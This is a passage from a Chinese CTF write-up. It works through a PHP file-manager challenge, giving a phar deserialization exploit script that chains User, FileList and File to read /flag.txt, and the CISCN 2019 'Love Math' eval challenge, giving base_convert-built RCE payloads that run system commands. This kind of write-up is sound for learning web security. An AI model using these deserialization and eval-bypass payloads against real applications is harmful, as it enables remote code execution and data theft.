        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();
        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();
        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();
        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);

        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">"."</span>, <span class="hljs-variable">$filenames</span>);
        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);
        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">".."</span>, <span class="hljs-variable">$filenames</span>);
        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);

        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) {
            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();
            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);
            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);
            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>{
        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) {
            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable">$table</span> = <span class="hljs-string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;
        <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;thead&gt;&lt;tr&gt;'</span>;
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) {
            <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;th scope="col" class="text-center"&gt;'</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">'&lt;/th&gt;'</span>;
        }
        <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;
        <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) {
            <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;tr&gt;'</span>;
            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) {
                <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;td class="text-center"&gt;'</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">'&lt;/td&gt;'</span>;
            }
            <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;td class="text-center" filename="'</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;
            <span class="hljs-variable">$table</span> .= <span class="hljs-string">'&lt;/tr&gt;'</span>;
        }
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);
        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">' B'</span>, <span class="hljs-string">' KB'</span>, <span class="hljs-string">' MB'</span>, <span class="hljs-string">' GB'</span>, <span class="hljs-string">' TB'</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>download.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])) {
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">include</span> <span class="hljs-string">"class.php"</span>;
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"open_basedir"</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">":/etc:/tmp"</span>);

<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'sandbox'</span>]);
<span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();
<span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">"flag"</span>) === <span class="hljs-literal">false</span>) {
    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">"Content-type: application/octet-stream"</span>);
    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">"Content-Disposition: attachment; filename="</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File not exist"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>delete.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>])) {
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])) {
    <span class="hljs-keyword">die</span>();
}

<span class="hljs-keyword">include</span> <span class="hljs-string">"class.php"</span>;

<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'sandbox'</span>]);
<span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();
<span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) {
    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();
    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">"Content-type: application/json"</span>);
    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"success"</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">"error"</span> =&gt; <span class="hljs-string">""</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">"Content-type: application/json"</span>);
    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"success"</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">"error"</span> =&gt; <span class="hljs-string">"File not exist"</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>我们可以发现存在敏感函数：<code>file_get_contents($this-&gt;filename);</code>，如果我们可以让filename为flag文件，那就得到flag了。</p>
<p>接下来就思考如何控制filename变量，我们先定位其所在函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172543945.png" alt="image-20240124172543945"></p>
<p>可以看到其位于File类的close函数，接下来看谁调用过该函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172614227.png" alt="image-20240124172614227"></p>
<p>我们可以在User类中的析构函数发现db调用了close函数，但如果我们直接利用这个链子是不行的，因为没有回显。那我们只好接着找寻其他回显数据的地方了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124172728776.png" alt="image-20240124172728776"></p>
<p>我们可以看到FileList类中的析构函数会回显对应的$func和$filename内容，那这里肯定就是最终获取flag的地方了，</p>
<p>接下来我们可以再看一下call魔术方法：当访问一个类中不可访问的方法时调用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124173537688.png" alt="image-20240124173537688"></p>
<p>这里会将函数名引入funcs变量中，之后foreach循环，对每一个file变量对应的文件执行func也就是close方法，之后将得到的结果存入results数组中。</p>
<p>那链子基本明显了，就是User.destruct-》FileList.call-》File.destruct。</p>
<p>接下来就是寻找那里可以触发了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124173957173.png" alt="image-20240124173957173"></p>
<p>可以看到虽然download.php文件可以调用close，但是过滤了flag关键字。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124174050592.png" alt="image-20240124174050592"></p>
<p>而delete.php就没有任何限制，因此我们肯定要从这里入手，接下来就是构造phar文件内容了（配合file_get_contents实现反序列化）点击删除之后调用detele函数，接着又调用unlik函数实现phar反序列化</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>();                                               
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();
        <span class="hljs-variable">$file</span>-&gt;filename = <span class="hljs-string">'/flag.txt'</span>;                                                       
        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$file</span>);
    }
}

<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"exp.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>); <span class="hljs-comment">//设置stub</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
<span class="hljs-comment">//签名自动计算</span>
<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>接着将生成的1.phar文件后缀改为jpg上传，之后点击删除抓包，如下图所示得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240124181101487.png" alt="image-20240124181101487"></p>
<h1 id="ciscn-2019初赛love-math">[CISCN 2019初赛]Love Math</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}<span class="hljs-keyword">else</span>{
    <span class="hljs-comment">//例子 c=20-1</span>
    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"太长了不会算"</span>);
    }
    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>];
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/'</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">'/m'</span>, <span class="hljs-variable">$content</span>)) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的字符"</span>);
        }
    }
    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>, <span class="hljs-string">'base_convert'</span>, <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'dechex'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];
    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的函数"</span>);
        }
    }
    <span class="hljs-comment">//帮你算出答案</span>
    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">';'</span>);
}</code></pre>
<p>这题代码逻辑简单，就是传参进去的内容长度不超过80，并且其中的内容还要符合白名单，这里的正则的作用就是提取content变量中的函数名。最终目的是要RCE</p>
<p>这里刷题少，没知识点，直接看wp学了：</p>
<ul>
<li><strong>动态函数</strong><br>
php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数<br>
例如：<code>$function = "sayHello";$function();</code>-》执行sayHello函数</li>
<li><strong>php中函数名默认为字符串</strong><br>
例如本题白名单中的<code>asinh</code>和<code>pi</code>可以直接异或，这就增加了构造字符的选择</li>
</ul>
<p>方法很多，一个个学吧，其中最关键的函数就是<code>base_convert</code>，而我们最终的目的就是拼接函数+拼接变量的思路来构造payload</p>
<pre><code class="hljs scss">base_convert ( string $number , int $frombase , int $tobase ) : string</code></pre>
<p>返回一字符串，包含 <code>number</code> 以 <code>tobase</code> 进制的表示。<code>number</code> 本身的进制由 <code>frombase</code> 指定。<code>frombase</code> 和 <code>tobase</code> 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。意思就是将输入数字的进制进行转换。</p>
<p>可以使用这个函数将其他进制数转为36进制，而且36进制是包含所有数字和小写字母的。但终究无法构造<code>GET</code>大写字母。但又可以构造其他的小写字母函数，让构造的函数转换。</p>
<pre><code class="hljs scss">hexdec ( string $hex_string ) : number    //十六进制转换为十进制
dechex ( int <span class="hljs-variable">$number</span> ) : string        //十进制转换为十六进制
bin2hex ( string <span class="hljs-variable">$str</span> ) : string    //函数把包含数据的二进制字符串转换为十六进制值
hex2bin ( string <span class="hljs-variable">$data</span> ) : string    //转换十六进制字符串为二进制字符串</code></pre>
<p>那么我们就可以想象一下，把<code>_GET</code>先利用<code>bin2hex()</code>转换为 十六进制，在利用<code>hexdec()</code>转换为十进制，那么反过来就可以把一段数字转换为字符。</p>
<p>但是<code>binhex()</code>， <code>hexdec()</code>等不是白名单的函数，要从哪里来？</p>
<p>这时候就要看<code>base_convert()</code>的作用了，因为上面的函数都是小写的，所以可以利用此函数将一个十进制数的数字转为三十六进制的小写字符。这里三十六进制是10个数字+26个小写字母，因此能够完整表示出一个函数名的所有字符。</p>
<p>那么怎么才能直到这个数呢？我们可以先逆向将三十六进制字符转换为十进制数，得到该数字，最终逆向构造即可。</p>
<h2 id="方法一">方法一：</h2>
<p>接下来就是构造hex2bin与_GET字符串了，框架如下：</p>
<pre><code class="hljs scss">?c=($_GET[a])($_GET[b])&amp;<span class="hljs-selector-tag">a</span>=system&amp;<span class="hljs-selector-tag">b</span>=cat /flag<span class="hljs-comment">//后面两个是传参,题目把东西都过滤的差不多了，只有数字，不可能有字母，所以用$_GET传参类似于上文的$a=cat。但是这里把[]过滤了，可以用{}代替</span></code></pre>
<p>构造如下：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">base_convert</span>('hex2bin',<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);        <span class="hljs-comment">//37907361743</span>
<span class="hljs-built_in">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);    <span class="hljs-comment">//hex2bin</span></code></pre>
<pre><code class="hljs scss"><span class="hljs-built_in">bin2hex</span>('_GET');    <span class="hljs-comment">//得到 5f474554 将字符转换为十六进制</span>
<span class="hljs-built_in">hexdec</span>('<span class="hljs-number">5</span>f474554');    <span class="hljs-comment">//得到 1598506324 将十六进制转为十进制</span>
 
<span class="hljs-built_in">dechex</span>(<span class="hljs-number">1598506324</span>);        <span class="hljs-comment">//得到 5f474554 将十进制转换为十六进制</span>
<span class="hljs-built_in">hex2bin</span>('<span class="hljs-number">5</span>f474554');    <span class="hljs-comment">//得到 _GET</span></code></pre>
<p>接下来编写payload</p>
<pre><code class="hljs scss">?c=<span class="hljs-variable">$pi</span>=<span class="hljs-built_in">bin_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));$<span class="hljs-variable">$pi</span>{abs}($$pi{cos})&amp;abs=system&amp;cos=ls
<span class="hljs-comment">//进一步cat flag即可</span></code></pre>
<h2 id="方法二">方法二：</h2>
<p>可以构造<code>getallheaders()</code>传参，此是小写的，可以直接用<code>base_convert</code>转换。</p>
<pre><code class="hljs scss">getallheaders ( void ) : array</code></pre>
<p>获取全部 HTTP 请求头信息。首先构造<code>system</code>和<code>getallheaders</code>：</p>
<pre><code class="hljs scss"><span class="hljs-built_in">base_convert</span>('getallheaders',<span class="hljs-number">30</span>,<span class="hljs-number">10</span>);
<span class="hljs-comment">//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功</span>
 
<span class="hljs-built_in">base_convert</span>('system',<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);    <span class="hljs-comment">//得到1751504350</span></code></pre>
<p>payload如下：</p>
<pre><code class="hljs scss">?c=<span class="hljs-variable">$pi</span>=base_convert;<span class="hljs-variable">$pi</span>(<span class="hljs-number">1751504350</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)($pi(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)(){<span class="hljs-number">1</span>})
<span class="hljs-selector-tag">HEADER</span>: <span class="hljs-number">1</span>:cat /flag
